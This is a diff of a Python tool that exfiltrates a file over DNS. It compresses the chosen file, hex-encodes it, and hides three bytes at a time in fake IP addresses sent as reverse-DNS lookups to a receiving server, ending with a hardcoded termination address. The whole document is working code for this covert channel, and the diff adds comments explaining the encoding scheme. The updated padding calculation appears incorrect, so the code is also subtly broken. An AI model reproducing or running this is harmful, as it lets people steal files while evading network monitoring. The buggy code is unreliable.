@@ -3,9 +3,12 @@ import random
 import os
 import zipfile
 from math import floor
+import sys
 
 baseline = 0
 
+# The first octet is used as a 'key' for decoding subsequent octets. If the first digit of the octet is even, then the second octet was looped back around
+# from 255; an odd digit means no such transformation happened. Using this, we can reassemble the bytes on the server-side.
 def send_data(set_baseline=False,octets=[]):
     global baseline
     beginning_octet = ""
@@ -16,20 +19,23 @@ def send_data(set_baseline=False,octets=[]):
         octets  = [random.randrange(0,255),random.randrange(0,255)]
         constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{baseline}"
     else:
-        beginning_octet = ""
         for index in range(len(octets)):
+            # Calculate the offsetted value
             octets[index] = str(int(octets[index]) + baseline)
+            # If the value is greater than 255, we have to wrap back around. We note this with an even digit in the first octet
             if int(octets[index]) > 255:
                 if len(beginning_octet) < 1:
-                    beginning_octet+="2"
+                    beginning_octet="2"
                 else:
                     beginning_octet+=str(random.choice([x for x in range(2, 5, 2)]))
                 octets[index] = str(int(octets[index]) - 255)
             else:
                 if len(beginning_octet) < 1:
-                    beginning_octet+="1"
+                    beginning_octet="1"
                 else:
                     beginning_octet+=str(random.choice([x for x in range(1, 4, 2)]))
+
+            # Build the address that will be sent to the server
             constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{octets[2]}"
 
     reverse_dns_dnspython(f"{constructed}")
@@ -39,7 +45,6 @@ def convert_to_ipv4(portion):
     ipv4_address_elements = []
     for byte in portion:
         ipv4_address_elements.append(str(int(byte,16)))
-
     send_data(set_baseline=False,octets=ipv4_address_elements)
 
 def reverse_dns_dnspython(ip_address):
@@ -54,43 +59,40 @@ def reverse_dns_dnspython(ip_address):
     except:
         pass
 
-if __name__ == "__main__":
-    increment = 0
-    if os.path.isfile("recovered"):
-        os.remove("recovered")
+def cleanup(items):
+    for item in items:
+        if os.path.isfile(item):
+            os.remove(item)
 
-    if os.path.isfile("compressed.gz"):
-        os.remove("compressed.gz")
+if __name__ == "__main__":
+    filename = sys.argv[1]
+    size_of_chunk = 3
+    cleanup(["compressed.gz"])
 
     with zipfile.ZipFile("compressed.gz", mode="w", compression=zipfile.ZIP_DEFLATED,compresslevel=9) as archive:
-        archive.write("test.py")
+        archive.write(f"{filename}")
 
-    with open("compressed.gz","rb") as f:
+    with open("compressed.gz","rb") as f: 
         data = f.read().hex()
 
+    # Split the full hex data into hex bytes, and add any necessary 00 padding at the end.
     segmented = [data[i:i+2] for i in range(0, len(data), 2)]
-
+    padding = ['00']*(len(segmented) % size_of_chunk)
+    segmented = segmented + padding
     send_data(set_baseline=True)
 
-    size_of_chunk = 3
+    # Send chunks of three encoded bytes to the server
     prior = 0
     print("[*] SENDING DATA")
     for index in range(0,len(segmented)):
         if index!=0 and index%size_of_chunk==0:
-            portion = segmented[prior:index]
+            convert_to_ipv4(segmented[prior:index])
             prior = index
-            convert_to_ipv4(portion)
-            print(f"[*] {increment}/{floor(len(segmented)/3)}")
-            increment+=1
-
-    diff = len(segmented) - prior
-    if (size_of_chunk-diff) >= 0:
-        portion = segmented[prior:]
-        for x in range(size_of_chunk-diff):
-            portion.append('00')
-        convert_to_ipv4(portion)
+        print(f"[*] {index}/{floor(len(segmented))}")
     
-    print(f"[?] {size_of_chunk-diff} 00'S APPENDED TO END OF RECOVERED FILE FOR PADDING")
-    octets  = [random.randrange(0,255),random.randrange(0,255),random.randrange(0,255)]
-    reverse_dns_dnspython(f"104.{octets[0]}.{octets[1]}.{octets[2]}")
+    print(f"[?] {len(padding)} 00'S APPENDED TO END OF RECOVERED FILE FOR PADDING")
+
+    # Send hardcoded termination value
+    reverse_dns_dnspython("104.6.7.2")
     print(f"[!] FINISHED SENDING DATA")
+    cleanup(["compressed.gz"])
